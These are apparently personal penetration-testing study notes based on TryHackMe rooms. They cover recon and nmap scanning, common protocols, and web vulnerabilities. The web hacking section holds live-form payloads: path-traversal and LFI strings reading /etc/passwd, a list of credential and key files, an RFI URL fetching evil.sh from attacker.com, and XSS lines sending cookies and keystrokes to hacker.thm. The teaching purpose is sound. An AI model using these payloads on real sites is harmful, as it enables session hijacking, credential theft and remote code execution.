# Penetration Testing Notes

---

# Network Security

Networks are subject to attacks from malicious sources. Attacks can be from two categories: “Passive” when a network intruder intercepts data traveling through the network, and “Active” in which an intruder initiates commands to disrupt the network's normal operation or to conduct reconnaissance and lateral movements to find and gain access to assets available via the network.

## Reconnaissance

Reconnaissance (recon) can be defined as a preliminary survey to gather information about a target. It is the first step in [The Unified Kill Chain](https://www.unifiedkillchain.com/) to gain an initial foothold on a system. We divide reconnaissance into:

1. Passive Reconnaissance
2. Active Reconnaissance

**Passive Recon:**

In passive reconnaissance, you rely on publicly available knowledge. It is the knowledge that you can access from publicly available resources without directly engaging with the target. Think of it like you are looking at target territory from afar without stepping foot on that territory.

### Whois

```bash
whois DOMAIN_NAME
```

Search for various public information about specific domain

### Nslookup

```bash
nslookup OPTIONS DOMAIN_NAME SERVER
```

Name Server Look Up. Find an IP address for its domain.

Some query type for nslookup:

| Query Type | Result |
| --- | --- |
| A | IPv4 Addresses |
| AAAA | IPv6 Addresses |
| CNAME | Canonical Name |
| MX | Mail Servers |
| SOA | Start of Authority |
| TXT | TXT Records |

e.g.

```bash
nslookup -type=A tryhackme.com 1.1.1.1
```

Look up only for IPv4 address for [tryhackme.com](http://tryhackme.com) on 1.1.1.1 cloudflare dns server.

### Dig

```bash
dig @SERVER DOMAIN_NAME TYPE
```

Domain Information Grouper, For more advanced DNS queries.

Some query type for dig (note that are the same as nslookup):

| Query Type | Result |
| --- | --- |
| A | IPv4 Addresses |
| AAAA | IPv6 Addresses |
| CNAME | Canonical Name |
| MX | Mail Servers |
| SOA | Start of Authority |
| TXT | TXT Records |

### DNSDumpster

[https://dnsdumpster.com/](https://dnsdumpster.com/)

### Shodan.io

[https://www.shodan.io/](https://www.shodan.io/)

---

**Active Recon:**

Active reconnaissance requires you to make some kind of contact with your target. This contact can be a phone call or a visit to the target company under some pretence to gather more information, usually as part of social engineering. Alternatively, it can be a direct connection to the target system, whether visiting their website or checking if their firewall has an SSH port open. Think of it like you are closely inspecting windows and door locks.

### Ping

```bash
ping MACHINE_IP
```

ping is a command that sends an ICMP Echo packet to a remote system. If the remote system is online, and the ping packet was correctly routed and not blocked by any firewall, the remote system should send back an ICMP Echo Reply. Similarly, the ping reply should reach the first system if appropriately routed and not blocked by any firewall.

### Traceroute

```bash
traceroute MACHINE_IP
```

traceroute command traces the route taken by the packets from your system to another host. The purpose of a traceroute is to find the IP addresses of the routers or hops that a packet traverses as it goes from your system to a target host. This command also reveals the number of routers between the two systems. It is helpful as it indicates the number of hops (routers) between your system and the target host.

### Telnet

```bash
telnet MACHINE_IP PORT
```

The TELNET (Teletype Network) protocol was developed in 1969 to communicate with a remote system via a command-line interface (CLI). Hence, the command telnet uses the TELNET protocol for remote administration. The default port used by telnet is 23. From a security perspective, telnet sends all the data, including usernames and passwords, in cleartext.

### Netcat

```bash
nc MACHINE_IP PORT
```

Netcat or simply nc supports both TCP and UDP protocols. It can function as a client that connects to a listening port; alternatively, it can act as a server that listens on a port of your choice. Hence, it is a convenient tool that you can use as a simple client or server over TCP or UDP.

On the *server* system, where you want to open a port and listen on it, you can issue `nc -vnlp PORT`

| Option | Meaning |
| --- | --- |
| -l | Listen mode |
| -p | Specify the Port number |
| -n | Numeric only; no resolution of hostnames via DNS |
| -v | Verbose output (optional, yet useful to discover any bugs) |
| -vv | Very Verbose (optional) |
| -k | Keep listening after client disconnects |

### Recap

| Purpose | Command line example |
| --- | --- |
| Lookup WHOIS record | whois tryhackme.com |
| Lookup DNS A records | nslookup -type=A tryhackme.com |
| Lookup DNS MX records at DNS server | nslookup -type=MX tryhackme.com 1.1.1.1 |
| Lookup DNS TXT records | nslookup -type=TXT tryhackme.com |
| Lookup DNS A records | dig tryhackme.com A |
| Lookup DNS MX records at DNS server | dig @1.1.1.1 tryhackme.com MX |
| Lookup DNS TXT records | dig tryhackme.com TXT |

| Command | Example |
| --- | --- |
| ping | ping -c 10 MACHINE_IP on Linux or macOS |
| ping | ping -n 10 MACHINE_IP on MS Windows |
| traceroute | traceroute MACHINE_IP on Linux or macOS |
| tracert | tracert MACHINE_IP on MS Windows |
| telnet | telnet MACHINE_IP PORT_NUMBER |
| netcat as client | nc MACHINE_IP PORT_NUMBER |
| netcat as server | nc -lvnp PORT_NUMBER |

source: [https://tryhackme.com/room/activerecon](https://tryhackme.com/room/activerecon), [https://tryhackme.com/room/passiverecon](https://tryhackme.com/room/passiverecon)

---

## Nmap

When we want to target a network, we want to find an efficient tool to help us handle repetitive tasks and answer the following questions:

1. Which systems are up?
2. What services are running on these systems?

The tool that we will rely on is Nmap.

### Host discovery

```bash
nmap -sn TARGETS
```

Discover online hosts without port-scanning (-sn) the live systems.

**Commands example table:**

| Scan Type | Example Command |
| --- | --- |
| ARP Scan | sudo nmap -PR -sn MACHINE_IP/24 |
| ICMP Echo Scan | sudo nmap -PE -sn MACHINE_IP/24 |
| ICMP Timestamp Scan | sudo nmap -PP -sn MACHINE_IP/24 |
| ICMP Address Mask Scan | sudo nmap -PM -sn MACHINE_IP/24 |
| TCP SYN Ping Scan | sudo nmap -PS22,80,443 -sn MACHINE_IP/30 |
| TCP ACK Ping Scan | sudo nmap -PA22,80,443 -sn MACHINE_IP/30 |
| UDP Ping Scan | sudo nmap -PU53,161,162 -sn MACHINE_IP/30 |

source: [https://tryhackme.com/room/nmap01](https://tryhackme.com/room/nmap01)

### Basic Port Scans

Type of scan

| Port Scan Type | Example Command |
| --- | --- |
| TCP Connect Scan | nmap -sT MACHINE_IP |
| TCP SYN Scan | sudo nmap -sS MACHINE_IP |
| UDP Scan | sudo nmap -sU MACHINE_IP |

Scan options

| Option | Purpose |
| --- | --- |
| -p- | all ports |
| -p1-1023 | scan ports 1 to 1023 |
| -F | 100 most common ports |
| -r | scan ports in consecutive order |
| -T<0-5> | T0 being the slowest and T5 the fastest |
| --max-rate 50 | rate <= 50 packets/sec |
| --min-rate 15 | rate >= 15 packets/sec |
| --min-parallelism 100 | at least 100 probes in parallel |

source: [https://tryhackme.com/room/nmap02](https://tryhackme.com/room/nmap02)

### Advanced Port Scans

| Port Scan Type | Example Command |
| --- | --- |
| TCP Null Scan | sudo nmap -sN MACHINE_IP |
| TCP FIN Scan | sudo nmap -sF MACHINE_IP |
| TCP Xmas Scan | sudo nmap -sX MACHINE_IP |
| TCP Maimon Scan | sudo nmap -sM MACHINE_IP |
| TCP ACK Scan | sudo nmap -sA MACHINE_IP |
| TCP Window Scan | sudo nmap -sW MACHINE_IP |
| Custom TCP Scan | sudo nmap --scanflags URGACKPSHRSTSYNFIN MACHINE_IP |
| Spoofed Source IP | sudo nmap -S SPOOFED_IP MACHINE_IP |
| Spoofed MAC Address | --spoof-mac SPOOFED_MAC |
| Decoy Scan | nmap -D DECOY_IP,ME MACHINE_IP |
| Idle (Zombie) Scan | sudo nmap -sI ZOMBIE_IP MACHINE_IP |
| Fragment IP data into 8 bytes | -f |
| Fragment IP data into 16 bytes | -ff |

source: [https://tryhackme.com/room/nmap03](https://tryhackme.com/room/nmap03)

### Post Port Scans

| Option | Meaning |
| --- | --- |
| -sV | determine service/version info on open ports |
| -sV --version-light | try the most likely probes (2) |
| -sV --version-all | try all available probes (9) |
| -O | detect OS |
| --traceroute | run traceroute to target |
| --script=SCRIPTS | Nmap scripts to run |
| -sC or --script=default | run default scripts |
| -A | equivalent to -sV -O -sC --traceroute |
| -oN | save output in normal format |
| -oG | save output in grepable format |
| -oX | save output in XML format |
| -oA | save output in normal, XML and Grepable formats |

source: [https://tryhackme.com/room/nmap04](https://tryhackme.com/room/nmap04)

---

## Protocols and Servers

### Telnet

The Telnet protocol is an application layer protocol used to connect to a virtual terminal of another computer. Using Telnet, a user can log into another computer and access its terminal (console) to run programs, start batch processes, and perform system administration tasks remotely.

### HTTP

Hypertext Transfer Protocol (HTTP) is the protocol used to transfer web pages (not only web pages). Your web browser connects to the webserver and uses HTTP to request HTML pages and images among other files and submit forms and upload various files. Anytime you browse the World Wide Web (WWW), you are certainly using the HTTP protocol.

### FTP

File Transfer Protocol (FTP) was developed to make the transfer of files between different computers with different systems efficient.

### SMTP, POP3 and IMAP

Email delivery over the Internet requires the following components:

1. Mail Submission Agent (MSA)
2. Mail Transfer Agent (MTA)
3. Mail Delivery Agent (MDA)
4. Mail User Agent (MUA)

Simple Mail Transfer Protocol (SMTP) is used to communicate with an MTA server.

Post Office Protocol version 3 (POP3) is a protocol used to download the email messages from a Mail Delivery Agent (MDA) server.

Internet Message Access Protocol (IMAP) is more sophisticated than POP3. IMAP makes it possible to keep your email synchronized across multiple devices (and mail clients).

### SSH

Secure Shell (SSH) was created to provide a secure way for remote system administration. In other words, it lets you securely connect to another system over the network and execute commands on the remote system.

### Common ports

| Protocol/Secured Protocol | Default Port / with TLS | Application |
| --- | --- | --- |
| FTP / FTPS | 21 / 990 | File Transfer |
| HTTP / HTTPS | 80 / 443 | Worldwide Web |
| IMAP / IMAPS | 143 / 993 | Email (MDA) |
| POP3 / POP3S | 110 / 995 | Email (MDA) |
| SMTP / SMTPS | 25 / 465 | Email (MTA) |
| Telnet / N/A | 23 / N/A | Remote Access |
| SSH | 22 | Secure Remote Access |
| SFTP | 22 | Secure File Transfer |

source: [https://tryhackme.com/room/protocolsandservers](https://tryhackme.com/room/protocolsandservers), [https://tryhackme.com/room/protocolsandservers2](https://tryhackme.com/room/protocolsandservers2)

---

# Web Hacking

## IDOR

IDOR stands for Insecure Direct Object Reference and is a type of access control vulnerability.

This type of vulnerability can occur when a web server receives user-supplied input to retrieve objects (files, data, documents), too much trust has been placed on the input data, and it is not validated on the server-side to confirm the requested object belongs to the user requesting it.

## File Inclusion

In some scenarios, web applications are written to request access to files on a given system, including images, static text, and so on via parameters. Parameters are query parameter strings attached to the URL that could be used to retrieve data or perform actions based on user input. 

File inclusion vulnerabilities are commonly found and exploited in various programming languages for web applications, such as PHP that are poorly written and implemented. 

The main issue of these vulnerabilities is the input validation, in which the user inputs are not sanitized or validated, and the user controls them. When the input is not validated, the user can pass any input to the function, causing the vulnerability.

### Path Traversal

Also known as **Directory Traversal**, a web security vulnerability allows an attacker to read operating system resources, such as local files on the server running an application. The attacker exploits this vulnerability by manipulating and abusing the web application's URL to locate and access files or directories stored outside the application's root directory.

Basic example: `http://webapp.thm/get.php?file=../../../../etc/passwd`

Common OS files useful to look for:

| Location | Description |
| --- | --- |
| /etc/issue | contains a message or system identification to be printed before the login prompt. |
| /etc/profile | controls system-wide default variables, such as Export variables, File creation mask (umask), Terminal types, Mail messages to indicate when new mail has arrived |
| /proc/version | specifies the version of the Linux kernel |
| /etc/passwd | has all registered user that has access to a system |
| /etc/shadow | contains information about the system's users' passwords |
| /root/.bash_history | contains the history commands for root user |
| /var/log/dmessage | contains global system messages, including the messages that are logged during system startup |
| /var/mail/root | all emails for root user |
| /root/.ssh/id_rsa | Private SSH keys for a root or any known valid user on the server |
| /var/log/apache2/access.log | the accessed requests for Apache webserver |
| C:\boot.ini | contains the boot options for computers with BIOS firmware |

### Local File Inclusion

LFI attacks against web applications are often due to a developers' lack of security awareness. With PHP, using functions such as include, require, include_once, and require_once often contribute to vulnerable web applications. In this room, we'll be picking on PHP, but it's worth noting LFI vulnerabilities also occur when using other languages such as ASP, JSP, or even in Node.js apps. LFI exploits follow the same concepts as path traversal.

In this section, we will walk you through various LFI scenarios and how to exploit them.

**1.** Suppose the web application provides two languages, and the user can select between the EN and AR

```php
<?PHP
	include($_GET["lang"]);
?>
```

The PHP code above uses a GET request via the URL parameter lang to include the file of the page. The call can be done by sending the following HTTP request as follows: http://webapp.thm/index.php?lang=EN.php to load the English page or http://webapp.thm/index.php?lang=AR.php to load the Arabic page, where EN.php and AR.php files exist in the same directory.

1. Next, In the following code, the developer decided to specify the directory inside the function.

```php
<?PHP
	include("languages/". $_GET['lang']);
?>
```

In the above code, the developer decided to use the include function to call PHP pages in the languages directory only via lang parameters.

If there is no input validation, the attacker can manipulate the URL by replacing the lang input with other OS-sensitive files such as /etc/passwd.

Again the payload looks similar to the path traversal, but the include function allows us to include any called files into the current page.

```
http://webapp.thm/index.php?lang=../../../../etc/passwd%00
```

Using null bytes is an injection technique where URL-encoded representation such as %00 or 0x00 in hex with user-supplied data to terminate strings. You could think of it as trying to trick the web app into disregarding whatever comes after the Null Byte.

NOTE: the %00 trick is fixed and not working with PHP 5.3.4 and above.

### Remote File Inclusion

Remote File Inclusion (RFI) is a technique to include remote files and into a vulnerable application. Like LFI, the RFI occurs when improperly 
sanitizing user input, allowing an attacker to inject an external URL 
into include function. One requirement for RFI is that the allow_url_fopen option needs to be on.

The risk of RFI is higher than LFI since RFI vulnerabilities allow an 
attacker to gain Remote Command Execution (RCE) on the server.

```
http://webapp.thm/index.php?file=http://attacker.com/evil.sh
```

## Server-Side Request Forgery

Server-Side Request Forgery (SSRF) it's a vulnerability that 
allows a malicious user to cause the webserver to make an additional or 
edited HTTP request to the resource of the attacker's choosing.

There are two types of SSRF vulnerability; the first is a regular SSRF where data is returned to the attacker's screen. The second is a Blind SSRF vulnerability where an SSRF occurs, but no information is returned to the attacker's screen.

A successful SSRF attack can result in any of the following:

- Access to unauthorised areas.
- Access to customer/organisational data.
- Ability to Scale to internal networks.
- Reveal authentication tokens/credentials.

Potential SSRF vulnerabilities can be spotted in web applications in 
many different ways. Here is an example of four common places to look:

1. When a full URL is used in a parameter in the address bar

```
http://website.com/form?server=http://api.website.com
```

1. A hidden field in a form
2. A partial URL such as just the hostname

```
http://website.com/form?server=api
```

1. Or perhaps only the path of the URL

```
http://website.com/form?server=/my/resource
```

## Cross-site Scripting

Cross-Site Scripting, better known as XSS in the cybersecurity community, is classified as an injection attack where malicious JavaScript gets injected into a web application with the intention of being executed by other users.

**Proof Of Concept:**

This is the simplest of payloads where all you want to do is demonstrate that you can achieve XSS on a website. This is often done by causing an alert box to pop up on the page with a string of text, for example:

`<script>alert('XSS');</script>`

**Session Stealing:**

Details of a user's session, such as login tokens, are often kept in cookies on the targets machine. The below JavaScript takes the target's cookie, base64 encodes the cookie to ensure successful transmission and then posts it to a website under the hacker's control to be logged. Once the hacker has these cookies, they can take over the target's session and be logged as that user.

`<script>fetch('https://hacker.thm/steal?cookie=' + btoa(document.cookie));</script>`

**Key Logger:**

The below code acts as a key logger. This means anything you type on the webpage will be forwarded to a website under the hacker's control. This could be very damaging if the website the payload was installed on 
accepted user logins or credit card details.

`<script>document.onkeypress = function(e) { fetch('https://hacker.thm/log?key=' + btoa(e.key) );}</script>`

**Business Logic:**

This payload is a lot more specific than the above examples. This would be about calling a particular network resource or a JavaScript function. For example, imagine a JavaScript function for changing the user's email address called `user.changeEmail()`. Your payload could look like this:

`<script>user.changeEmail('attacker@hacker.thm');</script>`

Now that the email address for the account has changed, the attacker may perform a reset password attack.

## Command Injection

Command injection is the abuse of an application's behaviour to 
execute commands on the operating system, using the same privileges that the application on a device is running with. For example, achieving command injection on a web server running as a user named `joe` will execute commands under this `joe` user - and therefore obtain any permissions that `joe` has.

A command injection vulnerability is also known as a "Remote Code 
Execution" (RCE) because an attacker can trick the application into 
executing a series of payloads that they provide, without direct access 
to the machine itself (i.e. an interactive shell). The webserver will 
process this code and execute it under the privileges and access 
controls of the user who is running that application.